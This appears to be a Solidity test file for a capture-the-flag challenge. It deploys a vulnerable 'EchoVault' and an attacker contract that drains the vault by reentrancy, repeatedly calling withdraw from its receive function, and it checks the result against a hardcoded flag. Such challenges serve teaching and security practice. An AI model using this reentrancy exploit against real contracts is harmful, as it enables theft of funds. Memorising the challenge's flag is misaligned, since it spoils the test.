// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Setup} from "../contracts/Setup.sol";

contract EchoVaultTest {
    function testReentrancySolvesChallenge() public {
        Setup setup = new Setup{value: 10 ether}();
        TestAttacker attacker = new TestAttacker(address(setup.vault()));

        attacker.attack{value: 1 ether}();

        require(setup.isSolved(), "challenge not solved");
        require(
            keccak256(bytes(setup.getFlag())) ==
                keccak256(bytes("HiB26{welcome_to_blockchain_reentrancy_attack_is_fun_right?}")),
            "wrong flag"
        );
    }
}

interface ITestEchoVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract TestAttacker {
    ITestEchoVault public vault;
    uint256 public attackAmount;

    constructor(address _vault) {
        vault = ITestEchoVault(_vault);
    }

    function attack() external payable {
        attackAmount = msg.value;

        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
